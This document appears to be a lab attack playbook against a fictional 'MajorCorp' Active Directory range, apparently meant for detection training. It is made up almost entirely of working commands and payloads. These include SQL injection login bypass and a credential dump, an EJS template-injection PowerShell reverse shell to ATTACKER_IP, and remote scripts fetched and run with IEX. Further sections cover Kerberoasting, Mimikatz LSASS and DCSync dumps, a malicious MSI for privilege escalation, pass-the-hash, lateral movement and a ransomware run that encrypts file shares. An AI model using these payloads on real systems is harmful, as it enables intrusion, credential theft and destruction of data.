# MajorCorp Attack Playbook — Full Kill Chain

> **Target**: MajorCorp HR Portal at `192.168.20.251`
> **Attacker**: Kali Linux
> **Scope**: Phases 1–6 (Initial Access → Ransomware)

---

## Variables — Set These First (Kali)

```bash
export WEB_IP=192.168.20.251
export ATTACKER_IP=<your_kali_ip>
```

## Phase 0 — Pre-Attack Verification

```bash
# Verify HR Portal is up
curl -s http://$WEB_IP/health

# Port scan
nmap -sV -p 80,443,3389,5985,5986 $WEB_IP

# Decompress wordlist (one-time)
gunzip /usr/share/wordlists/rockyou.txt.gz
```

---

## Phase 1 — Initial Access (T1190, T1059)

### 1.1 — Enumerate Web Endpoints

```bash
gobuster dir -u http://$WEB_IP -w /usr/share/wordlists/dirb/common.txt -x js,txt
```

Key endpoints discovered:

- `/login` — SQL Injection (auth bypass) — T1190
- `/reports` — SSTI / RCE via EJS template — T1059.007
- `/admin/diagnostic` — Command Injection — T1059.001
- `/upload` — Unrestricted file upload — T1190
- `/api/search?q=` — SQL Injection (data exfiltration) — T1190

### 1.2 — SQL Injection: Auth Bypass + Credential Dump (T1190)

Navigate to `http://<WEB_IP>/login`:

```
Username:  admin'--
Password:  (anything)
```

Then dump all credentials:

```
http://<WEB_IP>/api/search?q=' UNION SELECT username,password,role FROM users--
```

Expected credentials:

| Account | Password | Notes |
|---------|----------|-------|
| `admin` | `SuperSecretAdmin123!` | HR portal admin |
| `svc_backup` | `Backup2024!` | **Domain Admin** ★ |
| `svc_sql` | `Summer2024!` | Service account |
| `svc_web` | `WebApp123!` | Service account |
| `svc_iis` | `IISp@ss2024` | Service account |

### 1.3 — SSTI: Confirm RCE (T1059.007)

Log in, go to **Reports → Generate Report**, paste in the **Custom Header** field:

```
<%= global.process.mainModule.require('child_process').execSync('whoami').toString() %>
```

Expected output: `nt authority\system` or the Node service account.

Additional recon payloads for Custom Header:

```
# Confirm dual NIC — look for 10.0.2.x interface
<%= global.process.mainModule.require('child_process').execSync('ipconfig /all').toString() %>

# List domain users
<%= global.process.mainModule.require('child_process').execSync('net user /domain').toString() %>

# Dump environment variables
<%= JSON.stringify(process.env) %>
```

### 1.4 — Reverse Shell via SSTI (T1059.001)

**Step 1** — On Kali, start listener:

```bash
nc -lvnp 4444
```

**Step 2** — Paste in Custom Header (replace `ATTACKER_IP`):

```
<%= global.process.mainModule.require('child_process').execSync('powershell -nop -c "$c=New-Object Net.Sockets.TCPClient(\'ATTACKER_IP\',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+\'PS \'+$(pwd).Path+\' > \';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}"').toString() %>
```

You now have an interactive PowerShell shell on **WEB-SERVER**.

### 1.5 — Alternative: Command Injection (T1059.001)

If SSTI is unavailable, use `/admin/diagnostic` (requires admin session from 1.2). In the **IP Address** field:

```
127.0.0.1 & whoami
127.0.0.1 & net user /domain
127.0.0.1 & powershell -c "Get-ADUser -Filter * | Select SamAccountName"
```

---

## Phase 2 — Discovery & AD Enumeration (T1046, T1082, T1087)

> All commands run from the **reverse shell on WEB-SERVER**.

### 2.1 — Verify Internal Network Reachability

```powershell
Test-NetConnection -ComputerName 10.0.2.10 -Port 88    # DC01 Kerberos
Test-NetConnection -ComputerName 10.0.2.20 -Port 5985  # WORKSTATION WinRM
Test-NetConnection -ComputerName 10.0.2.30 -Port 445   # FILE-SERVER SMB
```

All three should return `TcpTestSucceeded : True`.

### 2.2 — Download & Run Post-Exploitation Toolkit

```powershell
# Option A: Load in memory
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SilentProcess87/LockDownLab/main/ad-scripts/Invoke-PostExploitation.ps1')

# Option B: Save to disk
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SilentProcess87/LockDownLab/main/ad-scripts/Invoke-PostExploitation.ps1' `
    -OutFile C:\Invoke-PostExploitation.ps1 -UseBasicParsing
```

If WEB-SERVER has no internet, upload via Evil-WinRM from Kali:

```bash
evil-winrm -i $WEB_IP -u Administrator -p '<lab_password>'
upload /path/to/Invoke-PostExploitation.ps1 C:\Invoke-PostExploitation.ps1
```

### 2.3 — Run Full Automated Recon

```powershell
.\Invoke-PostExploitation.ps1 -Phase Recon
# Output: C:\Temp\PostExploit\Reports\01_Reconnaissance.json
```

This automatically:
- Enumerates local host (OS, IPs, services)
- Port-scans `10.0.2.0/24` — discovers DC01, WORKSTATION, FILE-SERVER
- LDAP-queries AD for all users, groups, computers, Domain Admins, SPNs
- Downloads and runs **SharpHound** with `-c All`

---

## Phase 3 — Credential Access (T1558, T1003, T1552)

### 3.1 — Automated Credential Harvesting

```powershell
.\Invoke-PostExploitation.ps1 -Phase Credentials
# Output: C:\Temp\PostExploit\Reports\02_Credentials.json
```

### 3.2 — Kerberoasting with Rubeus (T1558.003)

```powershell
# Roast all service accounts
C:\Temp\PostExploit\Tools\Rubeus.exe kerberoast /outfile:C:\Temp\PostExploit\Loot\kerberoast.txt /simple

# Target svc_backup specifically
C:\Temp\PostExploit\Tools\Rubeus.exe kerberoast /user:svc_backup /outfile:C:\Temp\PostExploit\Loot\svc_backup.hash
```

Kerberoastable accounts:

| Account | SPN | Cracked Password | Privilege |
|---------|-----|-------------------|-----------|
| **svc_backup** | `backup/dc01.majorcorp.local` | `Backup2024!` | **Domain Admin** ★ |
| svc_sql | `MSSQLSvc/sql01.majorcorp.local:1433` | `Summer2024!` | Service |
| svc_web | `HTTP/web01.majorcorp.local` | `WebApp123!` | Service |
| svc_iis | `HTTP/iis01.majorcorp.local` | `IISp@ss2024` | Service |

### 3.3 — AS-REP Roasting (T1558.004)

```powershell
C:\Temp\PostExploit\Tools\Rubeus.exe asreproast /outfile:C:\Temp\PostExploit\Loot\asrep.txt /simple
# Vulnerable: svc_legacy (Legacy2024!), temp.user (TempP@ss123)
```

### 3.4 — GPP Password from SYSVOL (T1552.006)

```powershell
. C:\Temp\PostExploit\Tools\GetGPPPassword.ps1
Get-GPPPassword
# Reveals: local_admin : LocalAdminP@ss123!
```

### 3.5 — LSASS Dump with Mimikatz (T1003.001)

```powershell
. C:\Temp\PostExploit\Tools\InvokeMimikatz.ps1
Invoke-Mimikatz -Command "sekurlsa::logonpasswords"
```

### 3.6 — Registry Hive Dump (T1003.002)

```powershell
reg save HKLM\SAM      C:\Temp\PostExploit\Loot\SAM      /y
reg save HKLM\SYSTEM   C:\Temp\PostExploit\Loot\SYSTEM   /y
reg save HKLM\SECURITY C:\Temp\PostExploit\Loot\SECURITY /y
```

### 3.7 — Crack Hashes on Kali

Transfer loot files to Kali, then:

```bash
# Kerberoast (RC4-HMAC)
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force
# → svc_backup : Backup2024!  ← DOMAIN ADMIN

# AS-REP
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force
# → svc_legacy : Legacy2024!  |  temp.user : TempP@ss123

# NTLM (from Mimikatz / secretsdump)
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

---

## Phase 4 — Privilege Escalation (T1078, T1574.005)

### 4.1 — Use Cracked Domain Admin Credentials (T1078) — Primary Path

```powershell
$cred = New-Object System.Management.Automation.PSCredential(
    "MAJORCORP\svc_backup",
    (ConvertTo-SecureString "Backup2024!" -AsPlainText -Force)
)
Enter-PSSession -ComputerName 10.0.2.10 -Credential $cred
# Prompt: [DC01]: PS C:\Users\svc_backup\Documents>  ← Domain Admin confirmed
```

### 4.2 — AlwaysInstallElevated: SYSTEM via MSI (T1574.005) — Alternative Path

Verify GPO is active on WORKSTATION:

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated
Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated
# Both should return 1
```

Generate malicious MSI on **Kali**:

```bash
msfvenom -p windows/adduser USER=hacker PASS=Hacker123! -f msi -o privesc.msi
```

Upload and execute on target:

```powershell
msiexec /quiet /qn /i C:\privesc.msi
# Runs as SYSTEM — adds hacker:Hacker123! as local admin
```

### 4.3 — Pass-the-Hash Spray from Kali (T1550.002)

```bash
crackmapexec smb 10.0.2.0/24 -u svc_backup -p 'Backup2024!' -d MAJORCORP
crackmapexec smb 10.0.2.0/24 -u Administrator -H <NTLM_HASH> --local-auth
# "Pwn3d!" = confirmed local admin
```

---

## Phase 5 — Lateral Movement (T1021, T1047, T1550)

### 5.1 — Move to WORKSTATION (10.0.2.20)

```powershell
# From WEB-SERVER reverse shell
$cred = New-Object System.Management.Automation.PSCredential(
    "MAJORCORP\bob.johnson",
    (ConvertTo-SecureString "ITadmin2024!" -AsPlainText -Force)
)
Enter-PSSession -ComputerName 10.0.2.20 -Credential $cred
```

From **Kali** (alternative):

```bash
evil-winrm -i 10.0.2.20 -u bob.johnson -p 'ITadmin2024!'
```

### 5.2 — Move to DC01 (10.0.2.10)

```powershell
$cred = New-Object System.Management.Automation.PSCredential(
    "MAJORCORP\svc_backup",
    (ConvertTo-SecureString "Backup2024!" -AsPlainText -Force)
)
Enter-PSSession -ComputerName 10.0.2.10 -Credential $cred
```

From **Kali**:

```bash
evil-winrm -i 10.0.2.10 -u svc_backup -p 'Backup2024!'
# Or:
psexec.py MAJORCORP/svc_backup:'Backup2024!'@10.0.2.10
```

### 5.3 — DCSync: Dump All Domain Hashes (T1003.006)

From DC01 session (or any machine with DA creds):

```powershell
. C:\Temp\PostExploit\Tools\InvokeMimikatz.ps1
Invoke-Mimikatz -Command "lsadump::dcsync /domain:MajorCorp.local /all /csv"
Invoke-Mimikatz -Command "lsadump::dcsync /domain:MajorCorp.local /user:krbtgt"
Invoke-Mimikatz -Command "lsadump::dcsync /domain:MajorCorp.local /user:Administrator"
```

From **Kali** (no Mimikatz needed):

```bash
secretsdump.py MAJORCORP/svc_backup:'Backup2024!'@10.0.2.10 -just-dc-ntlm
```

### 5.4 — Move to FILE-SERVER (10.0.2.30)

```bash
evil-winrm -i 10.0.2.30 -u it.admin -p 'ITadminP@ss!'
```

Or via PowerShell:

```powershell
$cred = New-Object System.Management.Automation.PSCredential(
    "MAJORCORP\it.admin",
    (ConvertTo-SecureString "ITadminP@ss!" -AsPlainText -Force)
)
Enter-PSSession -ComputerName 10.0.2.30 -Credential $cred
```

### 5.5 — Unconstrained Delegation: Capture TGTs (T1558.001)

FILE-SERVER has Unconstrained Delegation enabled:

```powershell
. C:\Temp\PostExploit\Tools\InvokeMimikatz.ps1
Invoke-Mimikatz -Command "sekurlsa::tickets /export"
Invoke-Mimikatz -Command "kerberos::ptt <CAPTURED_TICKET>.kirbi"
```

---

## Phase 6 — Ransomware Impact (T1486, T1490)

> **All Phase 6 commands run on FILE-SERVER (10.0.2.30).**

### 6.1 — Get a Session on FILE-SERVER

```bash
evil-winrm -i 10.0.2.30 -u it.admin -p 'ITadminP@ss!'
```

### 6.2 — Download the Simulation Script

```powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SilentProcess87/LockDownLab/main/ad-scripts/Invoke-RansomwareSimulation.ps1' `
    -OutFile C:\Invoke-RansomwareSimulation.ps1 -UseBasicParsing
```

If no internet, upload from Kali inside Evil-WinRM:

```bash
upload /path/to/ad-scripts/Invoke-RansomwareSimulation.ps1 C:\Invoke-RansomwareSimulation.ps1
```

### 6.3 — Shadow Copy Enumeration (T1490)

```powershell
vssadmin list shadows
Get-WmiObject Win32_ShadowCopy | Select-Object DeviceObject, InstallDate
```

### 6.4 — Dry Run (Safe Preview — Nothing Changes)

```powershell
.\Invoke-RansomwareSimulation.ps1 -TargetPath "D:\Shares" -DryRun
```

### 6.5 — Execute Ransomware Simulation

```powershell
# Standard run — auto-backup at C:\RansomwareBackup_<timestamp>
.\Invoke-RansomwareSimulation.ps1 -TargetPath "D:\Shares"

# Custom extension
.\Invoke-RansomwareSimulation.ps1 -TargetPath "D:\Shares" -Extension ".locked"

# No backup (more realistic, cannot auto-restore)
.\Invoke-RansomwareSimulation.ps1 -TargetPath "D:\Shares" -CreateBackups:$false

# If no D: drive
.\Invoke-RansomwareSimulation.ps1 -TargetPath "C:\Shares"
```

What happens:
- All `*.txt, *.doc, *.docx, *.xls, *.xlsx, *.pdf, *.csv, *.xml, *.json, *.pptx, *.jpg, *.png` are XOR-encrypted
- Encrypted files renamed to `*.majorcrypt` (or custom extension)
- Originals deleted; backup at `C:\RansomwareBackup_<timestamp>` unless disabled
- `RANSOM_NOTE.txt` dropped in every subdirectory

### 6.6 — Verify Impact

```powershell
Get-ChildItem D:\Shares -Recurse -Filter "*.majorcrypt" | Measure-Object
Get-ChildItem D:\Shares -Recurse -Filter "RANSOM_NOTE.txt"
Get-Content C:\RansomwareSimulation.log
```

### 6.7 — Restore Files After Training

```powershell
# Method 1: From automatic backup
Copy-Item -Path "C:\RansomwareBackup_*\*" -Destination "D:\Shares" -Recurse -Force

# Method 2: Decryption script
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SilentProcess87/LockDownLab/main/ad-scripts/Invoke-RansomwareRestore.ps1' `
    -OutFile C:\Invoke-RansomwareRestore.ps1 -UseBasicParsing
.\Invoke-RansomwareRestore.ps1 -TargetPath "D:\Shares" -Extension ".majorcrypt"
```

---

## Quick Reference — Credential Cheat Sheet

| Hop | Account | Password |
|-----|---------|----------|
| SQLi Auth Bypass | `admin'--` | (anything) |
| WEB-SERVER → WORKSTATION | `bob.johnson` | `ITadmin2024!` |
| Anywhere → DC01 (Domain Admin) | `svc_backup` | `Backup2024!` |
| Anywhere → FILE-SERVER | `it.admin` | `ITadminP@ss!` |
| GPP local admin | `local_admin` | `LocalAdminP@ss123!` |
| AS-REP accounts | `svc_legacy` / `temp.user` | `Legacy2024!` / `TempP@ss123` |

## Cortex XDR Expected Alerts

| Phase | Action | MITRE | Alert |
|-------|--------|-------|-------|
| 1 | SQLi login bypass | T1190 | SQL injection in web traffic |
| 1 | SSTI → RCE | T1059.007 | Suspicious child process from node.exe |
| 1 | Reverse shell | T1059.001 | Outbound TCP from web service |
| 2 | SharpHound | T1087 | Rapid LDAP enumeration |
| 2 | Port scan | T1046 | Scan from non-scanner host |
| 3 | Kerberoasting | T1558.003 | Anomalous TGS-REQ volume |
| 3 | AS-REP Roasting | T1558.004 | AS-REP without pre-auth |
| 3 | Mimikatz LSASS | T1003.001 | LSASS memory read — **Critical** |
| 3 | Registry hive dump | T1003.002 | Sensitive hive export |
| 3 | GPP cpassword | T1552.006 | SYSVOL Groups.xml access |
| 4 | AlwaysInstallElevated | T1574.005 | Elevated MSI — SYSTEM |
| 4 | svc_backup login | T1078 | Service account from workstation |
| 5 | Pass-the-Hash | T1550.002 | NTLM auth anomaly |
| 5 | WinRM lateral | T1021.006 | WinRM from unexpected host |
| 5 | DCSync | T1003.006 | DS-Replication from non-DC — **Critical** |
| 5 | Unconstrained delegation | T1558.001 | TGT capture on FILE-SERVER |
| 6 | Mass encryption | T1486 | Ransomware behavior — **Critical** |
| 6 | Ransom notes | T1486 | Note creation in multiple dirs |
| 6 | Shadow copy enum | T1490 | VSS activity |
